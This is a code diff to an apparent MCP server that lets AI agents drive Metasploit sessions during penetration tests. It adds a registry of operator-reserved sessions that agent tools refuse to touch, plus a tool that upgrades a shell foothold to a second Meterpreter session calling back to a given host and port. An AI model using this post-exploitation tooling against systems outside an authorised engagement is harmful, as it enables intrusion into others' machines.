@@ -127,6 +127,51 @@ def _log_session_io(session_id: str, command: str, output: str) -> None:
         pass
 
 
+# ── Operator-reserved sessions ───────────────────────────────────────────────
+# Sessions tagged here belong to the human operator (interacted with in the
+# tmux msfconsole). Agent-facing session tools refuse to touch them, so the
+# operator and the agents never contend for the same session's shell. The
+# registry is a small JSON side-file so the operator console can read it too.
+_OPERATOR_SESSIONS = _PROJECT_ROOT / "engagement" / "operator-sessions.json"
+
+
+def _load_reserved() -> dict:
+    try:
+        if _OPERATOR_SESSIONS.exists():
+            data = json.loads(_OPERATOR_SESSIONS.read_text())
+            if isinstance(data, dict) and isinstance(data.get("reserved"), dict):
+                return data["reserved"]
+    except Exception:
+        pass
+    return {}
+
+
+def _save_reserved(reserved: dict) -> None:
+    try:
+        _OPERATOR_SESSIONS.parent.mkdir(parents=True, exist_ok=True)
+        _OPERATOR_SESSIONS.write_text(json.dumps({"reserved": reserved}, indent=2))
+    except Exception:
+        pass
+
+
+def _is_reserved(session_id) -> bool:
+    return str(session_id) in _load_reserved()
+
+
+def _reserved_guard(session_id) -> str | None:
+    """Return a refusal (JSON) if the session is operator-reserved, else None."""
+    if _is_reserved(session_id):
+        return json.dumps({
+            "error": "operator_reserved",
+            "session_id": str(session_id),
+            "message": (
+                f"Session {session_id} is reserved for the human operator and "
+                "must not be driven by agents. Pick a different session."
+            ),
+        })
+    return None
+
+
 def create_server() -> FastMCP:
     mcp = FastMCP(
         "pen-agent-metasploit-server",
@@ -399,6 +444,7 @@ def create_server() -> FastMCP:
             return err
         try:
             sessions = client.sessions.list
+            reserved = _load_reserved()
             result = []
             for sid, meta in sessions.items():
                 result.append(
@@ -412,6 +458,9 @@ def create_server() -> FastMCP:
                         "username": meta.get("username"),
                         "info": meta.get("info"),
                         "alive": True,
+                        # True → reserved for the human operator; agents must not
+                        # drive it (execute/upload/kill/… refuse it).
+                        "operator_reserved": str(sid) in reserved,
                     }
                 )
             return json.dumps({"sessions": result, "count": len(result)})
@@ -434,6 +483,9 @@ def create_server() -> FastMCP:
         """
         if not session_id or not command:
             return "ERROR: session_id and command are required."
+        guard = _reserved_guard(session_id)
+        if guard:
+            return guard
         client, err = _require_client()
         if err:
             return err
@@ -476,6 +528,9 @@ def create_server() -> FastMCP:
         """
         if not session_id or not lhost:
             return "ERROR: session_id and lhost are required."
+        guard = _reserved_guard(session_id)
+        if guard:
+            return guard
         try:
             validate_option_value(lhost)
         except ValidationError as e:
@@ -519,6 +574,9 @@ def create_server() -> FastMCP:
             return "ERROR: session_id, local_path, and remote_path are required."
         if not Path(local_path).exists():
             return f"ERROR: Local file not found: {local_path}"
+        guard = _reserved_guard(session_id)
+        if guard:
+            return guard
         client, err = _require_client()
         if err:
             return err
@@ -547,6 +605,9 @@ def create_server() -> FastMCP:
         """
         if not session_id or not remote_path:
             return "ERROR: session_id and remote_path are required."
+        guard = _reserved_guard(session_id)
+        if guard:
+            return guard
         client, err = _require_client()
         if err:
             return err
@@ -576,6 +637,9 @@ def create_server() -> FastMCP:
         """
         if not session_id:
             return "ERROR: session_id is required."
+        guard = _reserved_guard(session_id)
+        if guard:
+            return guard
         client, err = _require_client()
         if err:
             return err
@@ -600,6 +664,9 @@ def create_server() -> FastMCP:
         """
         if not session_id:
             return "ERROR: session_id is required."
+        guard = _reserved_guard(session_id)
+        if guard:
+            return guard
         client, err = _require_client()
         if err:
             return err
@@ -611,6 +678,134 @@ def create_server() -> FastMCP:
             return json.dumps({"status": "killed", "session_id": str(session_id)})
         except Exception as e:
             return f"ERROR: {e}"
+
+    # ── Operator-reserved sessions ──────────────────────────────────
+
+    @mcp.tool()
+    @_serialized
+    def reserve_operator_session(session_id: str = "", note: str = "operator") -> str:
+        """Reserve an existing session for the HUMAN OPERATOR.
+
+        Agent-facing session tools (execute, upload, download, ifconfig,
+        upgrade_to_meterpreter, kill_session, start_socks_proxy) then REFUSE to
+        act on it, so the operator can drive it in the tmux msfconsole without
+        contending with the agents. Reversible with release_operator_session.
+
+        Args:
+            session_id: Session ID to hand to the operator. Required.
+            note: Free-text label (e.g. which host / why). Default "operator".
+        """
+        if not session_id:
+            return "ERROR: session_id is required."
+        client, err = _require_client()
+        if err:
+            return err
+        if str(session_id) not in {str(k) for k in client.sessions.list}:
+            return f"ERROR: Session {session_id} not found or dead."
+        reserved = _load_reserved()
+        reserved[str(session_id)] = {
+            "reserved_at": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
+            "note": note,
+        }
+        _save_reserved(reserved)
+        return json.dumps({"status": "reserved", "session_id": str(session_id), "note": note})
+
+    @mcp.tool()
+    @_serialized
+    def release_operator_session(session_id: str = "") -> str:
+        """Release an operator-reserved session back to the agents."""
+        if not session_id:
+            return "ERROR: session_id is required."
+        reserved = _load_reserved()
+        existed = reserved.pop(str(session_id), None) is not None
+        _save_reserved(reserved)
+        return json.dumps({"status": "released" if existed else "not_reserved",
+                           "session_id": str(session_id)})
+
+    @mcp.tool()
+    @_serialized
+    def spawn_operator_session(session_id: str = "", lhost: str = "", lport: int = 4444) -> str:
+        """Spawn a SECOND session from a foothold and reserve it for the operator.
+
+        Call this once per host right after a foothold so the operator always
+        has a dedicated session to interact with while the agents keep working
+        the original — no contention on a single shell.
+
+        Reliable path (source is a shell): runs
+        post/multi/manage/shell_to_meterpreter to spawn a fresh Meterpreter
+        session, which is then reserved. For a Meterpreter-origin foothold there
+        is no shell to re-stage from here, so this returns needs_manual — catch
+        a second callback yourself (or attach one in tmux) and call
+        reserve_operator_session on it.
+
+        Args:
+            session_id: The foothold session to spawn a sibling from. Required.
+            lhost: Callback host for the new session's stager. Required.
+            lport: Callback port for the new session (default 4444). Use a port
+                   distinct from the agents' handlers.
+        """
+        if not session_id or not lhost:
+            return "ERROR: session_id and lhost are required."
+        try:
+            validate_option_value(lhost)
+        except ValidationError as e:
+            return f"ERROR: {e}"
+        client, err = _require_client()
+        if err:
+            return err
+        sessions = client.sessions.list
+        if str(session_id) not in {str(k) for k in sessions}:
+            return f"ERROR: Session {session_id} not found or dead."
+        stype = str(sessions[int(session_id) if str(session_id).isdigit() else session_id].get("type", ""))
+        if "meterpreter" in stype.lower():
+            return json.dumps({
+                "status": "needs_manual",
+                "message": (
+                    "Source is a Meterpreter session — can't re-stage a sibling "
+                    "from here. Catch a second callback (or open one in tmux) and "
+                    "call reserve_operator_session on it."
+                ),
+            })
+        before = {str(k) for k in sessions}
+        try:
+            mod = client.modules.use("post", "multi/manage/shell_to_meterpreter")
+            mod["SESSION"] = int(session_id)
+            mod["LHOST"] = lhost
+            mod["LPORT"] = int(lport)
+            result = mod.execute()
+            err_msg = _execute_error(result, expect_job=True)
+            if err_msg:
+                return f"ERROR: Operator-session spawn failed: {err_msg}"
+        except Exception as e:
+            return f"ERROR: Operator-session spawn failed: {e}"
+        # Poll for the newly-created session, then reserve it.
+        new_sid = None
+        for _ in range(30):
+            time.sleep(1)
+            now = {str(k) for k in client.sessions.list}
+            fresh = now - before
+            if fresh:
+                new_sid = sorted(fresh, key=lambda s: int(s) if s.isdigit() else s)[-1]
+                break
+        if new_sid is None:
+            return json.dumps({
+                "status": "spawn_started_unconfirmed",
+                "job_id": result.get("job_id"),
+                "message": ("Spawn launched but no new session appeared within 30s. "
+                            "Poll list_sessions; reserve it with reserve_operator_session."),
+            })
+        reserved = _load_reserved()
+        reserved[new_sid] = {
+            "reserved_at": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
+            "note": f"operator (spawned from session {session_id})",
+        }
+        _save_reserved(reserved)
+        return json.dumps({
+            "status": "reserved",
+            "operator_session_id": new_sid,
+            "from_session_id": str(session_id),
+            "message": f"Session {new_sid} spawned and reserved for the operator.",
+        })
 
     # ── Generic module execution (scope-gated on RHOSTS) ────────────
 
@@ -764,6 +959,9 @@ def create_server() -> FastMCP:
         """
         if not session_id:
             return "ERROR: session_id is required."
+        guard = _reserved_guard(session_id)
+        if guard:
+            return guard
         client, err = _require_client()
         if err:
             return err
